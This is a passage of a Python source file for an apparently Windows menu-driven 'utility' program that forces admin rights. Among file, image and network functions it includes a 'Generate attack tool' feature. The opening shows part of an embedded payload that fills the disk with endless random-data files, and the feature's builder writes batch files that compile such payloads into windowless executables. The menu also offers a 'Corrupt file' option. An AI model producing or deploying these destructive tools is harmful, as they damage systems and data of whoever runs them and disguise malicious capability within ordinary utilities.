chunk_size = 100 * 1024 * 1024  # 100MB chunks
file_count = 0
total_size = 0

def get_random_filename(length=10):
    letters = string.ascii_letters + string.digits
    return ''.join(random.choice(letters) for _ in range(length))

try:
    while True:
        filename = f"huge_file_{get_random_filename()}.dat"
        with open(filename, 'wb') as f:
            # Write in smaller blocks to show progress
            for _ in range(10):  # 10MB at a time
                f.write(os.urandom(10 * 1024 * 1024))  # Random data
                f.flush()  # Ensure data is written to disk
                total_size += 10
        
        file_count += 1
        
"""
        }
    }
    
    # Display options
    print(f"{Fore.YELLOW}Available Tools:")
    for key, tool in attack_tools.items():
        print(f"{key}. {tool['name']:<12} - {tool['desc']}")
    print("6. Exit")
    
    # Get user choice
    choice = input(f"\n{Fore.RED}Select tool to generate (1-6): {Fore.WHITE}")
    
    if choice == "6":
        return
    
    if choice not in attack_tools:
        print(f"{Fore.RED}Invalid choice!")
        input(f"\n{Fore.CYAN}Press Enter to continue...")
        return
    
    # Selected tool info
    tool = attack_tools[choice]
    tool_name = tool["name"].replace(" ", "_").lower()
    
    # Create directory for scripts if it doesn't exist
    script_dir = os.path.join(os.getcwd(), "attack_tools")
    os.makedirs(script_dir, exist_ok=True)
    
    # Create the Python script
    script_path = os.path.join(script_dir, f"{tool_name}.py")
    
    try:
        with open(script_path, "w") as f:
            f.write(tool["code"].strip())
        
        print(f"\n{Fore.GREEN}Created Python script: {script_path}")
        print(f"{Fore.YELLOW}You can run this script with Python directly.")
        
        # Create a build script for compiling to EXE instead of just a launcher
        if os.name == 'nt':
            # Create a build.bat that safely compiles the tool to an EXE
            build_path = os.path.join(script_dir, f"build_{tool_name}.bat")
            with open(build_path, "w") as f:
                f.write(f'''@echo off
echo {tool["name"]} - Attack Tool Builder
echo ========================================
echo This script will compile the attack tool to a standalone executable
echo Warning: The compiled tool can cause damage to your system!

REM Try to find Python from multiple possible locations
set PYTHON_PATH=

REM Check Python 3.13
if exist "%LocalAppData%\\Programs\\Python\\Python313\\python.exe" (
    set PYTHON_PATH="%LocalAppData%\\Programs\\Python\\Python313\\python.exe"
    goto found_python
)

REM Check Python 3.12
if exist "%LocalAppData%\\Programs\\Python312\\python.exe" (
    set PYTHON_PATH="%LocalAppData%\\Programs\\Python312\\python.exe"
    goto found_python
)

REM Check Program Files
if exist "C:\\Program Files\\Python312\\python.exe" (
    set PYTHON_PATH="C:\\Program Files\\Python312\\python.exe"
    goto found_python
)

REM Check Program Files (x86)
if exist "C:\\Program Files (x86)\\Python312\\python.exe" (
    set PYTHON_PATH="C:\\Program Files (x86)\\Python312\\python.exe"
    goto found_python
)

REM Check Windows Store Python
if exist "%LocalAppData%\\Microsoft\\WindowsApps\\python.exe" (
    set PYTHON_PATH="%LocalAppData%\\Microsoft\\WindowsApps\\python.exe"
    goto found_python
)

echo Python installation not found!
echo Please make sure Python is installed correctly.
pause
exit /b 1

:found_python
echo Found Python at: %PYTHON_PATH%

REM Check for PyInstaller
%PYTHON_PATH% -m pip show pyinstaller >nul 2>&1
if errorlevel 1 (
    echo Installing PyInstaller...
    %PYTHON_PATH% -m pip install --user pyinstaller
    if errorlevel 1 (
        echo Failed to install PyInstaller!
        pause
        exit /b 1
    )
)

echo Building executable...
%PYTHON_PATH% -m PyInstaller --onefile --noconsole "{script_path}"

if exist "dist\\{tool_name}.exe" (
    echo.
    echo Build successful! Executable created at: dist\\{tool_name}.exe
    echo WARNING: This file can cause damage to your system!
) else (
    echo.
    echo Build failed! Check for errors above.
)

pause
''')
            
            print(f"{Fore.GREEN}Created build script: {build_path}")
            print(f"{Fore.YELLOW}Run the build script to create an executable.")

    except Exception as e:
        print(f"{Fore.RED}Error creating files: {str(e)}")
    
    input(f"\n{Fore.CYAN}Press Enter to return to main menu...")

def batch_image_processing():
    """
    Batch process images with various operations like resize, convert format, etc.
    Requires Pillow library.
    """
    try:
        from PIL import Image
    except ImportError:
        print(f"{Fore.RED}This feature requires the Pillow library. Install it with 'pip install Pillow'")
        return
    
    print(f"\n{Fore.CYAN}Batch Image Processing")
    print(f"{Fore.CYAN}{'=' * 60}\n")
    
    print(f"{Fore.YELLOW}Select operation:")
    print(f"{Fore.WHITE}1. Resize images")
    print(f"{Fore.WHITE}2. Convert format (e.g., JPG to PNG)")
    print(f"{Fore.WHITE}3. Optimize/compress images")
    print(f"{Fore.WHITE}4. Add watermark")
    print(f"{Fore.WHITE}5. Return to main menu")
    
    choice = input(f"\n{Fore.GREEN}Choose option (1-5): {Fore.WHITE}")
    
    if choice == "5":
        return
    
    # Get files to process
    extensions = ['.jpg', '.jpeg', '.png', '.gif', '.bmp', '.webp']
    image_files = []
    
    for ext in extensions:
        image_files.extend([f for f in os.listdir() if f.lower().endswith(ext)])
    
    if not image_files:
        print(f"{Fore.RED}No image files found in current directory!")
        return
    
    print(f"\n{Fore.CYAN}Found {len(image_files)} image files.")
    
    # Create output directory
    output_dir = "processed_images"
    if not os.path.exists(output_dir):
        os.makedirs(output_dir)
    
    processed = 0
    
    if choice == "1":  # Resize
        width = int(input(f"{Fore.YELLOW}Enter new width in pixels (or 0 to maintain aspect ratio): {Fore.WHITE}"))
        height = int(input(f"{Fore.YELLOW}Enter new height in pixels (or 0 to maintain aspect ratio): {Fore.WHITE}"))
        
        with tqdm(total=len(image_files), desc="Resizing images", unit="image") as pbar:
            for img_file in image_files:
                try:
                    with Image.open(img_file) as img:
                        # Calculate dimensions maintaining aspect ratio if needed
                        orig_width, orig_height = img.size
                        if width == 0 and height > 0:
                            width = int(orig_width * (height / orig_height))
                        elif height == 0 and width > 0:
                            height = int(orig_height * (width / orig_width))
                        
                        resized_img = img.resize((width, height), Image.LANCZOS)
                        output_path = os.path.join(output_dir, img_file)
                        resized_img.save(output_path)
                        processed += 1
                except Exception as e:
                    print(f"{Fore.RED}Error processing {img_file}: {e}")
                finally:
                    pbar.update(1)
    
    elif choice == "2":  # Convert format
        target_format = input(f"{Fore.YELLOW}Enter target format (jpg, png, webp, etc.): {Fore.WHITE}").lower()
        
        with tqdm(total=len(image_files), desc="Converting images", unit="image") as pbar:
            for img_file in image_files:
                try:
                    name, _ = os.path.splitext(img_file)
                    with Image.open(img_file) as img:
                        # Convert to RGB if saving as JPG (removes alpha channel)
                        if target_format.lower() in ['jpg', 'jpeg'] and img.mode == 'RGBA':
                            img = img.convert('RGB')
                        
                        output_path = os.path.join(output_dir, f"{name}.{target_format}")
                        img.save(output_path)
                        processed += 1
                except Exception as e:
                    print(f"{Fore.RED}Error converting {img_file}: {e}")
                finally:
                    pbar.update(1)
    
    elif choice == "3":  # Optimize/compress
        quality = int(input(f"{Fore.YELLOW}Enter quality (1-100, lower = smaller file size): {Fore.WHITE}"))
        
        with tqdm(total=len(image_files), desc="Optimizing images", unit="image") as pbar:
            for img_file in image_files:
                try:
                    name, ext = os.path.splitext(img_file)
                    with Image.open(img_file) as img:
                        output_path = os.path.join(output_dir, img_file)
                        
                        # Convert to RGB if needed
                        if img.mode == 'RGBA' and ext.lower() in ['.jpg', '.jpeg']:
                            img = img.convert('RGB')
                        
                        img.save(output_path, quality=quality, optimize=True)
                        processed += 1
                except Exception as e:
                    print(f"{Fore.RED}Error optimizing {img_file}: {e}")
                finally:
                    pbar.update(1)
    
    elif choice == "4":  # Add watermark
        watermark_text = input(f"{Fore.YELLOW}Enter watermark text: {Fore.WHITE}")
        font_size = int(input(f"{Fore.YELLOW}Enter font size: {Fore.WHITE}"))
        position = input(f"{Fore.YELLOW}Enter position (top-left, top-right, bottom-left, bottom-right): {Fore.WHITE}").lower()
        
        with tqdm(total=len(image_files), desc="Adding watermark", unit="image") as pbar:
            for img_file in image_files:
                try:
                    with Image.open(img_file) as img:
                        draw = ImageDraw.Draw(img)
                        font = ImageFont.truetype("arial.ttf", font_size)
                        
                        text_width, text_height = draw.textsize(watermark_text, font=font)
                        width, height = img.size
                        
                        if position == "top-left":
                            x, y = 10, 10
                        elif position == "top-right":
                            x, y = width - text_width - 10, 10
                        elif position == "bottom-left":
                            x, y = 10, height - text_height - 10
                        elif position == "bottom-right":
                            x, y = width - text_width - 10, height - text_height - 10
                        else:
                            x, y = 10, 10
                        
                        draw.text((x, y), watermark_text, font=font, fill=(255, 255, 255, 128))
                        output_path = os.path.join(output_dir, img_file)
                        img.save(output_path)
                        processed += 1
                except Exception as e:
                    print(f"{Fore.RED}Error adding watermark to {img_file}: {e}")
                finally:
                    pbar.update(1)
    
    print(f"\n{Fore.GREEN}Processed {processed} images. Output saved to '{output_dir}'")

def main_menu():
    while True:
        clear_screen()
        display_header()
        width = min(os.get_terminal_size().columns, 60)

        current_dir = os.getcwd()
        display_dir = os.path.basename(current_dir)
        if not display_dir:
            display_dir = current_dir
        
        print(f"{Fore.CYAN}║ {Fore.WHITE}Current Directory: {Fore.YELLOW}{display_dir}{' ' * (width-22-len(display_dir))}{Fore.CYAN}║")
        print(f"{Fore.CYAN}╠═{'═' * (width-4)}═╣")
        
        sections = [
            ("File Operations", [
                "Change directory",
                "Search files",
                "Find duplicates", 
                "Quick actions",
                "Preview file",
                "Auto rename files",
                "Clean filenames",
                "Organize files",
                "Show categories",
                "Monitor directory",
                "Analyze disk space",
                "File statistics"
            ]),
            ("System Operations", [
                "System information",
                "Clean cache",
                "Disk health check",
                "Screen capture",
                "Encrypt file",
                "Decrypt file",
                "Check permissions",
                "Scan directory",
                "Verify file integrity",
                "Corrupt file"
            ]),
            ("Network Operations", [
                "Monitor network",
                "Network scan", 
                "IP lookup",
                "WiFi information",
                "Speed test",
                "DNS lookup"
            ]),
            ("Advanced Operations", [
                "System resources",
                "Monitor services",
                "Manage startup programs",
                "System restore",
                "Advanced search",
                "Process explorer",
                "Analyze memory",
                "Scan handles",
                "Map DLLs",
                "Analyze threads",
                "Trace stacks",
                "Generate attack tool",
                "Batch image processing",
                "Exit"
            ])
        ]

        start_num = 1
        for title, options in sections:
            display_menu_section(title, options, start_num)
            print(f"{Fore.CYAN}╠═{'═' * (width-4)}═╣")  # Add section separator
            start_num += len(options)

        print(f"{Fore.CYAN}╚═{'═' * (width-4)}═╝")  # Add bottom border
        
        try:
            choice = input(f"\n{Fore.GREEN}Enter your choice (1-{start_num-1}): {Fore.WHITE}")
            
            if choice == '1':
                change_directory()
                
            elif choice == '2':
                directory = os.getcwd()
                pattern = input(f"{Fore.YELLOW}Enter search pattern: {Fore.WHITE}")
                results = search_files(directory, pattern)
                print(f"\n{Fore.GREEN}Found {len(results)} files:")
                for i, file in enumerate(results, 1):
                    print(f"{i}. {file}")
                
            elif choice == '3':
                directory = os.getcwd()
                duplicates = find_duplicates(directory)
                print(f"\n{Fore.GREEN}Found {len(duplicates)} duplicate sets:")
                for i, (hash_val, files) in enumerate(duplicates.items(), 1):
                    print(f"\n{Fore.YELLOW}Duplicate set {i}:")
                    for file in files:
                        print(f"  {file}")
                
            elif choice == '4':
                quick_actions()
                
            elif choice == '5':
                filepath = input(f"{Fore.YELLOW}Enter file path: {Fore.WHITE}")
                preview_file(filepath)
                
            elif choice == '6':
                renamed = auto_rename()
                print(f"\n{Fore.GREEN}Renamed {renamed} files.")
                
            elif choice == '7':
                cleaned = clean_filenames()
                print(f"\n{Fore.GREEN}Cleaned {cleaned} filenames.")
                
            elif choice == '8':
                directory = os.getcwd()
                organize_files(directory)
                
            elif choice == '9':
                show_categories()
                
            elif choice == '10':
                directory = os.getcwd()
                monitor_directory(directory)
                
            elif choice == '11':
                directory = os.getcwd()
                space_usage = analyze_disk_space(directory)
                print(f"\n{Fore.GREEN}Space usage by file type:")
                for ext, size in sorted(space_usage.items(), key=lambda x: x[1], reverse=True):
                    print(f"{ext or 'No extension'}: {humanize.naturalsize(size)}")
                
            elif choice == '12':
                stats = file_stats()
                print(f"\n{Fore.CYAN}File Statistics for: {os.getcwd()}")
                print(f"\n{Fore.YELLOW}Total Files: {stats['count']}")
                print(f"Total Size: {humanize.naturalsize(stats['total_size'])}")
                
                print(f"\n{Fore.CYAN}File Types:")
                for ext, count in sorted(stats['types'].items()):
                    print(f"{ext}: {count} files")
                
                print(f"\n{Fore.CYAN}Size Distribution:")
                for category, count in stats['sizes'].items():
                    print(f"{category.title()}: {count} files")
                
                print(f"\n{Fore.CYAN}Age Distribution:")
                for category, count in stats['ages'].items():
                    print(f"{category.title()}: {count} files")
                
            elif choice == '13':
                info = get_system_info()
                print(f"\n{Fore.CYAN}System Information:")
                if isinstance(info, dict):
                    for key, value in info.items():
                        if key == "Disk Usage":
                            print(f"\n{Fore.YELLOW}Disk Usage:")
                            for disk, usage in value.items():
                                print(f"  {disk}: {usage}")
                        else:
                            print(f"{key}: {value}")
                else:
                    print(info)
                
            elif choice == '14':
                print(f"{Fore.YELLOW}Cleaning temporary files...")
                cleaned, errors = clean_cache()
                print(f"{Fore.GREEN}Cleaned {cleaned} items.")
                if errors:
                    print(f"\n{Fore.RED}Errors encountered:")
                    for error in errors[:5]:
                        print(f"• {error}")
                    if len(errors) > 5:
                        print(f"...and {len(errors) - 5} more errors")
                
            elif choice == '15':
                print(f"{Fore.YELLOW}Performing comprehensive disk health check...")
                results = disk_health_check()
                
                print(f"\n{Fore.CYAN}━━━ DISK HEALTH REPORT ━━━")
                
                print(f"\n{Fore.CYAN}Disk Space:")
                for drive, info in results["space_usage"].items():
                    total_gb = info["total"] / (1024**3)
                    used_gb = info["used"] / (1024**3)
                    free_gb = info["free"] / (1024**3)
                    print(f"{Fore.WHITE}Drive {drive}")
                    print(f"  Total: {total_gb:.1f} GB")
                    print(f"  Used:  {used_gb:.1f} GB ({info['percent_used']:.1f}%)")
                    print(f"  Free:  {free_gb:.1f} GB")
                
                print(f"\n{Fore.CYAN}Disk Performance:")
                if "disk_status" in results["performance"]:
                    print(f"Disk Status: {Fore.WHITE}{results["performance"]["disk_status"]}")
                if "fragmentation" in results["performance"]:
                    print(f"Fragmentation: {Fore.WHITE}{results["performance"]["fragmentation"]}")
                if "write_speed" in results["performance"]:
                    print(f"Write Speed: {Fore.WHITE}{results["performance"]["write_speed"]}")
                if "read_speed" in results["performance"]:
                    print(f"Read Speed: {Fore.WHITE}{results["performance"]["read_speed"]}")
                
                if results["warnings"]:
                    print(f"\n{Fore.YELLOW}Warnings:")
                    for warning in results["warnings"]:
                        print(f"• {warning}")
                
                if results["errors"]:
                    print(f"\n{Fore.RED}Errors:")
                    for error in results["errors"]:
                        print(f"• {error}")
                
                if not any(issues.values()):
                    print(f"\n{Fore.GREEN}No issues found in the directory.")
                    
            elif choice == '16':
                screen_capture()
                
            elif choice == '17':
                filepath = input(f"{Fore.YELLOW}Enter file to encrypt: {Fore.WHITE}")
                if os.path.exists(filepath):
                    key = encrypt_file(filepath)
                    print(f"{Fore.GREEN}File encrypted successfully.")
                    print(f"{Fore.YELLOW}Keep this key safe: {key.decode()}")
                else:
                    print(f"{Fore.RED}File not found!")
                    
            elif choice == '18':
                filepath = input(f"{Fore.YELLOW}Enter encrypted file: {Fore.WHITE}")
                key_path = input(f"{Fore.YELLOW}Enter key file path (or paste key): {Fore.WHITE}")
                try:
                    if os.path.exists(key_path):
                        with open(key_path, 'rb') as f:
                            key = f.read()
                    else:
                        key = key_path.encode()
                    decrypt_file(filepath, key)
                    print(f"{Fore.GREEN}File decrypted successfully.")
                except Exception as e:
                    print(f"{Fore.RED}Decryption failed: {str(e)}")

            elif choice == '19':
                path = input(f"{Fore.YELLOW}Enter file/folder name or path: {Fore.WHITE}")
                abs_path = os.path.abspath(path)
                perms = check_permissions(abs_path)
                
                if "error" in perms:
                    print(f"{Fore.RED}× Error: {perms['error']}")
                else:
                    print(f"\n{Fore.CYAN}Permission Details for: {path}")
                    print(f"\n{Fore.CYAN}Basic Access:")
                    for perm, value in perms["basic"].items():
                        icon = "✓" if value else "×"
                        color = Fore.GREEN if value else Fore.RED
                        print(f"{color}{icon} {perm.capitalize()}")
                    
                    if perms["owner"]:
                        print(f"\n{Fore.CYAN}Owner: {Fore.WHITE}{perms['owner']}")
                    
                    if perms["attributes"]:
                        print(f"\n{Fore.CYAN}File Attributes:")
                        for attr in perms["attributes"]:
                            print(f"{Fore.WHITE}• {attr}")

            elif choice == '20':
                directory = os.getcwd()
                print(f"{Fore.YELLOW}Scanning directory for potential issues...")
                issues = scan_directory(directory)
                if issues["security"]:
                    print(f"\n{Fore.RED}Security Issues:")
                    for issue in issues["security"]:
                        print(f"• {issue}")
                if issues["storage"]:
                    print(f"\n{Fore.YELLOW}Storage Issues:")
                    for issue in issues["storage"]:
                        print(f"• {issue}")
                if issues["suspicious"]:
                    print(f"\n{Fore.RED}Suspicious Files:")
                    for issue in issues["suspicious"]:
                        print(f"• {issue}")
                if issues["recommendations"]:
                    print(f"\n{Fore.CYAN}Recommendations:")
                    for issue in issues["recommendations"]:
                        print(f"• {issue}")
                if not any(issues.values()):
                    print(f"\n{Fore.GREEN}No issues found in the directory.")
                    
            elif choice == '21':
                filepath = input(f"{Fore.YELLOW}Enter file to check for corruption: {Fore.WHITE}")
                if os.path.exists(filepath):
                    print(f"{Fore.YELLOW}Checking file integrity...")
                    is_valid, message = verify_file_integrity(filepath)
                    if is_valid:
                        print(f"{Fore.GREEN}✓ File check passed!")
                        print(f"{Fore.WHITE}The file can be read completely without errors")
                    else:
                        print(f"{Fore.RED}× File appears to be corrupted!")
                        print(f"{Fore.WHITE}Error: {message}")
                else:
                    print(f"{Fore.RED}× File not found!")
                    
            elif choice == '22':
                filepath = input(f"{Fore.YELLOW}Enter file to corrupt: {Fore.WHITE}")
                corrupt_file(filepath)
                
            elif choice == '23':
                monitor_network()
            elif choice == '24':
                network_scan()
            elif choice == '25':
                ip_lookup()
            elif choice == '26':
                wifi_info()
            elif choice == '27':
                speed_test()
            elif choice == '28':
                dns_lookup()
            elif choice == '29':
                system_resources()
            elif choice == '30':
                monitor_services()
            elif choice == '31':           
                manage_startup()
            elif choice == '32':           
                system_restore()
            elif choice == '33':      
                advanced_search()
            elif choice == '34':         
                process_explorer()
            elif choice == "35":
                analyze_memory()
            elif choice == "36":
                scan_handles()
            elif choice == "37":
                map_dlls()
            elif choice == "38":
                analyze_threads()
            elif choice == "39":
                trace_stacks()
            elif choice == "40":
                generate_attack_tool()
            elif choice == "41":
                batch_image_processing()
            elif choice == "42":
                display_exit_screen()
                break

            if choice != '1':
                input(f"\n{Fore.CYAN}Press Enter to continue...{Fore.WHITE}")
                
        except Exception as e:
            print(f"{Fore.RED}An error occurred: {str(e)}")
            input(f"\n{Fore.CYAN}Press Enter to continue...{Fore.WHITE}")

if __name__ == "__main__":
    if not force_admin():
        sys.exit(1)
    main_menu()
